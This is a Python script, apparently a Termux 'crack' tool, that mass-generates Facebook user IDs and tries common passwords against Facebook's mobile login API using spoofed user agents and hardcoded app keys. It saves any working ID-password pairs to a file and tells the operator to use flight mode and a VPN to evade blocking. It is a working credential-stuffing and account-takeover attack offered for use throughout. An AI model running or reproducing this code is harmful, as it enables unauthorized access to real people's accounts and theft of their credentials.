#OWNER OF ASIF CHOWDHURY
import os
import sys
import random
import string
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor

user = []
oks = []
cps = []
loop = 0

#USER AGENT CODE BY GPT#
def generate_android_user_agent():
    rr = random.randint
    android_version = f"{rr(7, 13)}.{rr(0, 9)}"  
    device_model = random.choice(["Nokia 6.1", "Samsung Galaxy S9", "Pixel 4a", "OnePlus 7T"])  # Random device models
    build_id = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10))  # Random Build ID
    chrome_version = f"{rr(80, 100)}.0.{rr(4000, 5000)}.{rr(0, 150)}"  
    safari_version = "537.36"

    user_agent = (
        f"Mozilla/5.0 (Linux; Android {android_version}; {device_model} Build/{build_id}; wv) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) Version/4.0 "
        f"Chrome/{chrome_version} Mobile Safari/{safari_version}"
    )
    return user_agent

#USER AGENT CODE BY GPT#
def generate_firefox_user_agent():
    rr = random.randint
    rv_version = rr(30, 60)  
    win_version = random.choice(['6.1', '6.0', '5.1', '5.0'])  
    gecko_date = f"{rr(2000, 2020)}{str(rr(1, 12)).zfill(2)}{str(rr(1, 28)).zfill(2)}"  
    
    
    user_agent = f"Mozilla/5.0 (Windows NT {win_version}; WOW64; rv:{rv_version}.0) Gecko/{gecko_date} Firefox/{rv_version}.0"
    return user_agent

def generate_firefox_user_agent7():
    
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
def linex():
    print("-" * 50)
os.system("xdg-open https://t.me/Tarmux_KGF_TEM ")
def ____banner____():
    print(f"""
▗▖ ▗▖ ▗▄▄▖▗▖ ▗▖▗▄▄▄▖▗▖ ▗▖ ▗▄▖ 
▐▌ ▐▌▐▌   ▐▌ ▐▌  █  ▐▌ ▐▌▐▌ ▐▌
▐▌ ▐▌▐▌   ▐▛▀▜▌  █  ▐▛▀▜▌▐▛▀▜▌
▝▚▄▞▘▝▚▄▄▖▐▌ ▐▌▗▄█▄▖▐▌ ▐▌▐▌ ▐▌""")

def menu():
    clear()
    ____banner____()
    linex()
    print(f"[1] OLD CRACK ")
    print(f"[0] Exit")
    linex()
    fuck = input(f'[+] INPUT : ')
    if fuck == "1":
        Crack_xnxx()
    elif fuck == "0":
        pass	

def Crack_xnxx():
    clear()
    ____banner____()
    linex()
    print(f'[+] EXAMPLE : 3000/5000/10000/99999')
    linex()
    limit = int(input(f'[+] CHOICE  : '))   
    clear()
    for a in range(limit):
        AXN = "".join(random.choice(string.digits) for _ in range(9))
        user.append(AXN)

    with ThreadPoolExecutor(max_workers=30) as Fuck_xnxx:
        ____banner____()
        linex()
        print("[<>]TOTAL IDS - " + str(len(user)))
        print("[<>]USE FLIGHT MODE EVERY 3 MIN")
        print("[<>]USE 1.1.1.1 VPN FOR GOOD RESULT")
        linex()
        for love in user:
            ids = str("100000" + love)
            passlist = ["123456", "123456789"," 1234567", "12345678"]
            Fuck_xnxx.submit(Mathod_fuck, ids, passlist)
    
    sys.exit("\n-------------------------------")

def Mathod_fuck(ids, passlist):
    global loop, oks, cps
    sys.stdout.write(f"\rAXN [{loop}] | OK: [{len(cps)}]")
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
                'adid': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'cpl': 'true',
                'credentials_type': 'device_based_login_password',
                "source": "device_based_login",
                'error_detail_type': 'button_with_disabled',
                'format': 'json',
                'generate_session_cookies': '1',
                'generate_analytics_claim': '1',
                'generate_machine_id': '1',
                "family_device_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "locale": "en_US",
                "client_country_code": "US",
                "device_id": str(uuid.uuid4()),
                "method": "auth.login",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
            }
            head = {
                'content-type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent': generate_android_user_agent(),
                'accept-encoding': 'gzip, deflate',
                'x-fb-http-engine': 'Liger'
            }
            url = "https://b-graph.facebook.com/auth/login"
            response = requests.post(url, data=data, headers=head, verify=True).json()
            if "access_token" in response:
                print(f"\r\rA_X_N-OK | {ids} • {pas}")
                with open("AXN-OK.txt", "a") as f:
                    f.write(ids + "|" + pas + "\n")
                oks.append(ids)
                break
            elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                print(f"\r\rA_X_N-OK | {ids} • {pas}")
                with open("AXN-OK.txt", "a") as f:
                    f.write(ids + "|" + pas + "\n")
                cps.append(ids)
                break
        loop += 1
    except Exception as e:
        pass

if __name__ == "__main__":
    menu()